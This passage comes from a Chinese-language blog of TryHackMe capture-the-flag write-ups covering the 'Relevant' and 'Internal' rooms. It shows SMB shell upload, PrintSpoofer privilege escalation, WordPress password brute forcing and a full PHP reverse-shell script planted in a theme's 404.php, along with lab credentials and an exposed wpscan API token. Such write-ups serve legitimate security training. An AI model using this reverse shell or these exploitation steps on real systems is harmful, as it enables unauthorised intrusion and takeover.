<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839761.png" alt="image-20240429194613331"></p>
<p>接着连接SMB共享，然后put上传shell，之后浏览器或者curl访问</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839762.png" alt="image-20240429194709396"></p>
<pre><code class="hljs scss">dir /s /<span class="hljs-selector-tag">b</span> c:\ | find <span class="hljs-string">"user.txt"</span>
dir /s /b c:\ | find <span class="hljs-string">"root.txt"</span>

#Windows命令行-- 按文件名查找相关路径 dir /s /b c:\ | find <span class="hljs-string">"user.txt"</span>
#使用/b带有 DIR 命令的开关会去除所有多余的信息，仅显示当前目录中的文件夹和文件的名称，而不显示文件大小和时间戳等属性。
#或者直接输入 dir \user.txt /s</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839763.png" alt="image-20240429195040086"></p>
<h2 id="windows令牌提权">Windows令牌提权</h2>
<p>接着就是windows提权，还是不熟悉。。。。不过这里知道是利用令牌窃取</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839764.png" alt="image-20240429195357787"></p>
<p>由上图可知 当前用户似乎启用了 SeImpersonatePrivilege 令牌权限，这意味着我们可以使用令牌模拟来提升权限；接下来我们需要在目标机上执行一个漏洞利用程序–下载<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0">PrintSpoofer.exe</a>，并将该exe文件上传到目标机（可以通过SMB服务上传文件）。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839765.png" alt="image-20240429202300022"></p>
<p>上传之后</p>
<pre><code class="hljs scss">dir /s /<span class="hljs-selector-tag">b</span> c:\ | find <span class="hljs-string">"PrintSpoofer64.exe"</span></code></pre>
<p>找到exe所在位置，运行即可提权</p>
<pre><code class="hljs scss">PrintSpoofer64<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">i</span> -c cmd</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839766.png" alt="image-20240429202400973"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839767.png" alt="image-20240429202407158"></p>
<h2 id="总结">总结</h2>
<p>常规扫描之后，发现了139与445端口，尝试枚举SMB服务，发现四个共享文件，很可疑，接着扫描web站点目录，但没有结果，却发现四万多的端口也开启了IIS服务，接着尝试扫描该端口对应的目录，结果发现存在SMB共享目录。</p>
<p>接着发现SMB的共享目录允许上传文件（又因为能访问共享目录）会想到上传反向shell，之后访问拿到shell，接着就是Windows提权，whoami /priv发现某些特殊令牌开启了，直接github搜相关的利用工具，成功system权限。</p>
<p>给我的思考就是，在前期nmap扫的时候，就单纯的扫全端口即可，扫出来，在针对性的启用脚本扫描这些端口，可能会很快速。</p>
<p>接着扫目录也没必要陷入误区：非得扫web站点的目录（80端口）一定要都看看。还是得学会google，遇到相关关键问题，不会找办法利用，只能无脑看wp，这很可笑。</p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://madushan-perera.medium.com/tryhackme-relevant-walkthrough-6e7c83def069">TryHackMe: Relevant — Walkthrough</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@jovanski.wisuda/relevant-tryhackme-walkthrough-234ec27f1998">Relevant — TryHackMe: Walkthrough</a></p>
<p><a target="_blank" rel="noopener" href="https://systemweakness.com/relevant-try-hack-me-e5c614aca4f9">Relevant- Try Hack Me</a></p>
<h1 id="0x12-internal">0x12 Internal</h1>
<h2 id="渗透测试任务">渗透测试任务</h2>
<p>您已被分配给一位客户，该客户希望对三周后发布到生产环境的环境进行渗透测试。</p>
<p><strong>Scope of Work 工作范围</strong></p>
<p>客户请求工程师对所提供的虚拟环境进行外部、Web 应用程序和内部评估。客户要求提供有关评估的最少信息，希望从恶意行为者的角度进行参与（黑盒渗透测试）。客户要求您确保两个标志（未提供位置）作为利用证据：</p>
<ul>
<li>User.txt</li>
<li>Root.txt</li>
</ul>
<p>此外，客户还提供了以下范围津贴：</p>
<ul>
<li>确保修改主机文件以反映internal.thm</li>
<li>本次合作允许使用任何工具或技术</li>
<li>找到并记录所有发现的漏洞</li>
<li>将发现的标志提交到仪表板</li>
<li>仅分配给您计算机的 IP 地址在范围内</li>
</ul>
<p>（角色扮演关闭）</p>
<p>我鼓励您将这一挑战视为实际的渗透测试。考虑编写一份报告，其中包括执行摘要、漏洞和利用评估以及补救建议，因为这将有利于您为 eLearnsecurity eCPPT 或作为该领域渗透测试人员的职业生涯做准备。</p>
<p>注意 - 这个房间可以在没有 Metasploit 的情况下完成</p>
<h2 id="常规扫描">常规扫描</h2>
<pre><code class="hljs scss">nmap -T5 -<span class="hljs-selector-tag">p</span>- <span class="hljs-number">10.10</span><span class="hljs-selector-class">.188</span><span class="hljs-selector-class">.153</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839768.png" alt="image-20240430081644141"></p>
<p>发现只开启了两个端口，先扫一下web站点</p>
<pre><code class="hljs scss">gobuster dir -u "http://<span class="hljs-number">10.10</span>.<span class="hljs-number">188.153</span>/<span class="hljs-string">" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -t 50</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839769.png" alt="image-20240430083811925"></p>
<h2 id="wordpress渗透">wordpress渗透</h2>
<p>发现是存在wordpress CMS，上wpscan进行进一步的扫描</p>
<pre><code class="hljs scss">wpscan <span class="hljs-attr">--url</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">188.153</span>/wordpress/</code></pre>
<p>首先是简单扫描，发现wp版本：5.4.2，不过google了一番没找到利用的，想着wpscan能扫出啥，发现跟workthrough不一致，加不加token都扫不到这个wp的主题，但workthrough却可以，不理解</p>
<pre><code class="hljs scss"><span class="hljs-comment">//扫描插件漏洞</span>
wpscan <span class="hljs-attr">--api-token</span> WjvZf12T8mMWrRkopYBhoTCQ5tDZfdk0l0vxqNbEpwU <span class="hljs-attr">--url</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">188.153</span>/wordpress/ -e vp
//获取wp的用户名
wpscan --api-token WjvZf12T8mMWrRkopYBhoTCQ5tDZfdk0l0vxqNbEpwU --url http://internal.thm/wordpress/ -e u</code></pre>
<p>至于这个wp的用户名，我们就可以信息搜集一手，可以找博客，或者直接在登陆页面，输入一些用户名，看页面回显是否一致，还有就是上述wpscan爆出的用户名</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839770.png" alt="image-20240430103017069"></p>
<p>之后尝试利用wpscan爆破密码</p>
<pre><code class="hljs scss">wpscan <span class="hljs-attr">--url</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">188.153</span>/wordpress/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt</code></pre>
<p>密码：my2boys</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839771.png" alt="image-20240430093229348"></p>
<h2 id="建立shell">建立shell</h2>
<p>如下图找到主题编辑，可以看到能修改PHP文件，上传一个 php_reverse_shell.php即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839772.png" alt="image-20240430091638326"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span>
<span class="hljs-comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// This tool may be used for legal purposes only.  Users take full responsibility</span>
<span class="hljs-comment">// for any actions performed using this tool.  The author accepts no liability</span>
<span class="hljs-comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span>
<span class="hljs-comment">// do not use this tool.</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// In all other respects the GPL version 2 applies:</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// This program is free software; you can redistribute it and/or modify</span>
<span class="hljs-comment">// it under the terms of the GNU General Public License version 2 as</span>
<span class="hljs-comment">// published by the Free Software Foundation.</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// This program is distributed in the hope that it will be useful,</span>
<span class="hljs-comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span class="hljs-comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span class="hljs-comment">// GNU General Public License for more details.</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// You should have received a copy of the GNU General Public License along</span>
<span class="hljs-comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span class="hljs-comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// This tool may be used for legal purposes only.  Users take full responsibility</span>
<span class="hljs-comment">// for any actions performed using this tool.  If these terms are not acceptable to</span>
<span class="hljs-comment">// you, then do not use this tool.</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// You are encouraged to send comments, improvements or suggestions to</span>
<span class="hljs-comment">// me at pentestmonkey@pentestmonkey.net</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// Description</span>
<span class="hljs-comment">// -----------</span>
<span class="hljs-comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span>
<span class="hljs-comment">// The recipient will be given a shell running as the current user (apache normally).</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// Limitations</span>
<span class="hljs-comment">// -----------</span>
<span class="hljs-comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span>
<span class="hljs-comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span>
<span class="hljs-comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// Usage</span>
<span class="hljs-comment">// -----</span>
<span class="hljs-comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span>

<span class="hljs-title function_ invoke__">set_time_limit</span> (<span class="hljs-number">0</span>);
<span class="hljs-variable">$VERSION</span> = <span class="hljs-string">"1.0"</span>;
<span class="hljs-variable">$ip</span> = <span class="hljs-string">'10.14.79.125'</span>;  <span class="hljs-comment">// CHANGE THIS</span>
<span class="hljs-variable">$port</span> = <span class="hljs-number">5555</span>;       <span class="hljs-comment">// CHANGE THIS</span>
<span class="hljs-variable">$chunk_size</span> = <span class="hljs-number">1400</span>;
<span class="hljs-variable">$write_a</span> = <span class="hljs-literal">null</span>;
<span class="hljs-variable">$error_a</span> = <span class="hljs-literal">null</span>;
<span class="hljs-variable">$shell</span> = <span class="hljs-string">'uname -a; w; id; /bin/sh -i'</span>;
<span class="hljs-variable">$daemon</span> = <span class="hljs-number">0</span>;
<span class="hljs-variable">$debug</span> = <span class="hljs-number">0</span>;

<span class="hljs-comment">//</span>
<span class="hljs-comment">// Daemonise ourself if possible to avoid zombies later</span>
<span class="hljs-comment">//</span>

<span class="hljs-comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span>
<span class="hljs-comment">// our php process and avoid zombies.  Worth a try...</span>
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">'pcntl_fork'</span>)) {
        <span class="hljs-comment">// Fork and have the parent process exit</span>
        <span class="hljs-variable">$pid</span> = <span class="hljs-title function_ invoke__">pcntl_fork</span>();

        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -<span class="hljs-number">1</span>) {
                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"ERROR: Can't fork"</span>);
                <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
        }

        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) {
                <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Parent exits</span>
        }

        <span class="hljs-comment">// Make the current process a session leader</span>
        <span class="hljs-comment">// Will only succeed if we forked</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">posix_setsid</span>() == -<span class="hljs-number">1</span>) {
                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"Error: Can't setsid()"</span>);
                <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
        }

        <span class="hljs-variable">$daemon</span> = <span class="hljs-number">1</span>;
} <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span>);
}

<span class="hljs-comment">// Change to a safe directory</span>
<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">"/"</span>);

<span class="hljs-comment">// Remove any umask we inherited</span>
<span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">//</span>
<span class="hljs-comment">// Do the reverse shell...</span>
<span class="hljs-comment">//</span>

<span class="hljs-comment">// Open reverse connection</span>
<span class="hljs-variable">$sock</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);
<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) {
        <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)"</span>);
        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-comment">// Spawn shell process</span>
<span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(
   <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"r"</span>),  <span class="hljs-comment">// stdin is a pipe that the child will read from</span>
   <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>),  <span class="hljs-comment">// stdout is a pipe that the child will write to</span>
   <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>)   <span class="hljs-comment">// stderr is a pipe that the child will write to</span>
);

<span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);

<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$process</span>)) {
        <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"ERROR: Can't spawn shell"</span>);
        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-comment">// Set everything to non-blocking</span>
<span class="hljs-comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span>
<span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-number">0</span>);

<span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"Successfully opened reverse shell to <span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>"</span>);

<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
        <span class="hljs-comment">// Check for end of TCP connection</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$sock</span>)) {
                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"ERROR: Shell connection terminated"</span>);
                <span class="hljs-keyword">break</span>;
        }

        <span class="hljs-comment">// Check for end of STDOUT</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) {
                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"ERROR: Shell process terminated"</span>);
                <span class="hljs-keyword">break</span>;
        }

        <span class="hljs-comment">// Wait until a command is end down $sock, or some</span>
        <span class="hljs-comment">// command output is available on STDOUT or STDERR</span>
        <span class="hljs-variable">$read_a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);
        <span class="hljs-variable">$num_changed_sockets</span> = <span class="hljs-title function_ invoke__">stream_select</span>(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, <span class="hljs-literal">null</span>);

        <span class="hljs-comment">// If we can read from the TCP socket, send</span>
        <span class="hljs-comment">// data to process's STDIN</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) {
                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"SOCK READ"</span>);
                <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);
                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"SOCK: <span class="hljs-subst">$input</span>"</span>);
                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$input</span>);
        }

        <span class="hljs-comment">// If we can read from the process's STDOUT</span>
        <span class="hljs-comment">// send data down tcp connection</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$read_a</span>)) {
                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"STDOUT READ"</span>);
                <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$chunk_size</span>);
                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"STDOUT: <span class="hljs-subst">$input</span>"</span>);
                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);
        }

        <span class="hljs-comment">// If we can read from the process's STDERR</span>
        <span class="hljs-comment">// send data down tcp connection</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$read_a</span>)) {
                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"STDERR READ"</span>);
                <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$chunk_size</span>);
                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">"STDERR: <span class="hljs-subst">$input</span>"</span>);
                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);
        }
}

<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$sock</span>);
<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>]);
<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);
<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);
<span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);

<span class="hljs-comment">// Like print, but does nothing if we've daemonised ourself</span>
<span class="hljs-comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printit</span> (<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>{
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) {
                <span class="hljs-keyword">print</span> <span class="hljs-string">"<span class="hljs-subst">$string</span>\n"</span>;
        }
}

<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839773.png" alt="image-20240430091929444"></p>
<p>之后找到404.php文件所在路径，访问即可得到shell</p>
<pre><code class="hljs scss">wp-<span class="hljs-attribute">content</span>/themes/twentyseventeen/<span class="hljs-number">404</span><span class="hljs-selector-class">.php</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839774.png" alt="image-20240430093533449"></p>
<p>这里就最头疼了，想着靠自己努力努力，当前是www-data权限，所以需要提权，我一直认为有什么漏洞可以提权，但搞了半天找不到，我以为是提权姿势可能很骚，想不到还是要回归原始：信息搜集</p>
<h2 id="密码泄露提权user">密码泄露提权user</h2>
<p>walkthrough这里就是信息搜集，找到了opt目录下的敏感文件，查看发现用户泄露的密码。拿直接su 用户名切换即可</p>
<p>（为何是opt啊。。。）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839775.png" alt="image-20240430094356024"></p>
<pre><code class="hljs scss">aubreanna:bubb13guM!@<span class="hljs-number">#123</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839776.png" alt="image-20240430094503817"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839778.png" alt="image-20240430094454352"></p>
<p>同时发现本目录下这个文件，写着此时还在内网运行一个服务器</p>
